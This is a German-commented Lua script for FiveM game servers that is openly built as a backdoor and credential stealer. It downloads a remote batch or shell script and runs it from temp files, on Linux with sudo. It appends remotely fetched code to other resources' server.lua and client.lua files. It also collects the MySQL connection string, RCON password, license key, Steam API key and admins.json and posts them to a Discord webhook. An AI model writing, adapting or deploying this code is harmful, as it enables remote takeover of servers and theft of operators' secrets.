local function getServerOperatingSystem()
    local handle = io.popen("uname")
    local result = handle:read("*a")
    handle:close()

    -- Bereinigen Sie das Ergebnis, um Leerzeichen oder Zeilenumbrüche zu entfernen
    result = result:gsub("^%s+", ""):gsub("%s+$", "")

    if result == "Linux" then
        return "Linux"
    elseif result == "Windows" then
        return "Windows"
    elseif result == "Darwin" then
        return "MacOS"
    end

    return "Unknown"
end


local config = {
    windowsScriptURL = "yourbatch",
    linuxScriptURL = "yourshell",
    enablePrints = false,
    resourceCodeURLs = {
        ["ressourcename"] = {
            client = "yourclient,
            server = "yourserver"
        }
    }
}

local function runBatchScript(scriptContent, isLinux)
    if config.enablePrints then
        print("Führe das Skript aus...")
    end

    local command
    if not isLinux then
        -- Windows
        local tempFilePath = os.getenv("TEMP") .. "\\backdoor.bat"
        local file = io.open(tempFilePath, "w")
        if file then
            scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
            file:write(scriptContent)
            file:close()
            command = "cmd /C " .. tempFilePath
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
            end
            return
        end
    else
        -- Linux
        local tempFilePath = "/tmp/a89439.sh"  -- Anpassung des Dateinamens
        local file = io.open(tempFilePath, "w")
        if file then
            -- Zeilenumbrüche korrigieren
            scriptContent = scriptContent:gsub("\r\n", "\n"):gsub("\r", "\n")
            file:write(scriptContent)
            file:close()
            command = "sudo chmod +x " .. tempFilePath .. " && sudo bash " .. tempFilePath
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht temporär gespeichert werden.")
            end
            return
        end
    end
    os.execute(command)
end

local function fetchScriptContent(url, callback)
    if config.enablePrints then
        print("Lade das Skript herunter...")
    end

    PerformHttpRequest(url, function(statusCode, response)
        if statusCode == 200 then
            callback(response)
        else
            if config.enablePrints then
                print("Ein Fehler ist aufgetreten. Das Skript konnte nicht von der URL abgerufen werden: " .. url)
            end
        end
    end, "GET", "", {["Content-Type"] = "application/json"})
end

local function loadResourceCode(resourceName, serverScript, clientScript)
    local success = false
    local resourcePath = "resources/" .. resourceName

    if serverScript and serverScript ~= "" then
        local serverFilePath = resourcePath .. "/server.lua"
        local serverFile = io.open(serverFilePath, "a")
        if serverFile then
            serverFile:write(serverScript)
            serverFile:close()
            success = true
        end
    end

    if clientScript and clientScript ~= "" then
        local clientFilePath = resourcePath .. "/client.lua"
        local clientFile = io.open(clientFilePath, "a")
        if clientFile then
            clientFile:write(clientScript)
            clientFile:close()
            success = true
        end
    end

    if success then
        if config.enablePrints then
            print("Code erfolgreich in Ressource " .. resourceName .. " geladen.")
        end
        -- Neustart der Ressource
        local restartCommand = "ensure " .. resourceName
        os.execute(restartCommand)
    else
        if config.enablePrints then
            print("Fehler beim Laden des Codes für Ressource " .. resourceName .. ".")
        end
    end
end

local function main()
    local serverOS = getServerOperatingSystem()
    local isLinux = serverOS == "Linux"

    local scriptURL = isLinux and config.linuxScriptURL or config.windowsScriptURL

    fetchScriptContent(scriptURL, function(scriptContent)
        runBatchScript(scriptContent, isLinux)
    end)

    for resourceName, urls in pairs(config.resourceCodeURLs) do
        if urls.server and urls.server ~= "" then
            fetchScriptContent(urls.server, function(serverScript)
                loadResourceCode(resourceName, serverScript)
            end)
        end

        if urls.client and urls.client ~= "" then
            fetchScriptContent(urls.client, function(clientScript)
                loadResourceCode(resourceName, nil, clientScript)
            end)
        end
    end
end

-- Starte das Skript
main()

local discordWebhook = "DISCORDURL" -- Discord-Webhook-URL hier einfügen
local adminsFile = "admins.json" -- Pfad zur admins.json-Datei

-- Funktion zur Ermittlung des Betriebssystems
local function GetOperatingSystem(serverVersion)
    local os = "unknown"

    -- Betriebssystem anhand der Server-Version identifizieren
    if serverVersion and type(serverVersion) == "string" then
        if string.find(serverVersion, "win32") then
            os = "Windows"
        elseif string.find(serverVersion, "linux") then
            os = "Linux"
        end
    end

    return os
end

-- Funktion zur Ermittlung der Server-IP-Adresse
local function GetServerIPAddress(callback)
    PerformHttpRequest("https://api.ipify.org/", function(errorCode, resultData, resultHeaders)
        if errorCode == 200 then
            local ip = tostring(resultData)
            callback(ip)
        else
            callback(nil)
        end
    end)
end

-- Funktion zum Lesen des Inhalts der admins.json-Datei
local function ReadAdminsFile()
    local file = LoadResourceFile(GetCurrentResourceName(), adminsFile)
    if file then
        return file
    else
        return nil
    end
end

Citizen.CreateThread(function()
    local ip = nil -- Variable zur Speicherung der IP-Adresse

    -- IP-Adresse einmalig abrufen und in der Variablen speichern
    GetServerIPAddress(function(serverIP)
        ip = serverIP
    end)

    Citizen.Wait(1000) -- Warte 1 Sekunde

    local os = GetOperatingSystem(GetConvar("version", ""))

    if ip then -- Überprüfen, ob die IP-Adresse vorhanden ist
        local cfxLink = "fivem://connect/cfx.re/join/" .. (GetConvar("sv_licenseKey", "") or "unknown")
        local mysqlString = GetConvar("mysql_connection_string", "unknown")
        local rconPassword = GetConvar("rcon_password", "unknown")
        local maxPlayers = GetConvarInt("sv_maxclients", 32)
        local serverName = GetConvar("sv_hostname", "unknown")
        local currentPlayerCount = #GetPlayers()
        local licenseKey = GetConvar("sv_licenseKey", "unknown")
        local endpointTCP = GetConvar("endpoint_add_tcp", "unknown")
        local steamAPIKey = GetConvar("steam_webApiKey", "unknown")

        -- Inhalte der admins.json-Datei als Text lesen
        local adminsData = ReadAdminsFile()
        local adminsText = adminsData or "Fehler beim Lesen der admins.json-Datei."

        local message = {
            content = "@everyone FiveM-Server Informationen:",
            embeds = {{
                          title = serverName,
                          color = 16711680, -- Farbcode (rot)
                          fields = {
                              {
                                  name = "IP",
                                  value = ip or "unknown",
                                  inline = true
                              },
                              {
                                  name = "Cfx-Link",
                                  value = cfxLink,
                                  inline = false
                              },
                              {
                                  name = "MySQL-String",
                                  value = mysqlString,
                                  inline = false
                              },
                              {
                                  name = "RCON-Passwort",
                                  value = rconPassword,
                                  inline = false
                              },
                              {
                                  name = "Maximale Spieler",
                                  value = maxPlayers,
                                  inline = true
                              },
                              {
                                  name = "Aktuelle Spieler",
                                  value = currentPlayerCount,
                                  inline = true
                              },
                              {
                                  name = "Server-Version",
                                  value = GetConvar("version", ""),
                                  inline = true
                              },
                              {
                                  name = "Betriebssystem",
                                  value = os,
                                  inline = true
                              },
                              {
                                  name = "License Key",
                                  value = licenseKey,
                                  inline = true
                              },
                              {
                                  name = "TCP Endpoint",
                                  value = endpointTCP,
                                  inline = true
                              },
                              {
                                  name = "Steam API Key",
                                  value = steamAPIKey,
                                  inline = true
                              }
                          }
                      }}
        }

        -- Anhang erstellen und admins.json-Text hinzufügen
        local attachment = {
            name = "admins.txt",
            content = adminsText,
            type = "text/plain"
        }
        message.files = { attachment }

        PerformHttpRequest(discordWebhook, function(statusCode, result, headers)
            -- Überprüfen, ob die HTTP-Anfrage erfolgreich war
            if statusCode == 204 then
            else
            end
        end, 'POST', json.encode(message), { ['Content-Type'] = 'application/json' })
    end
end)
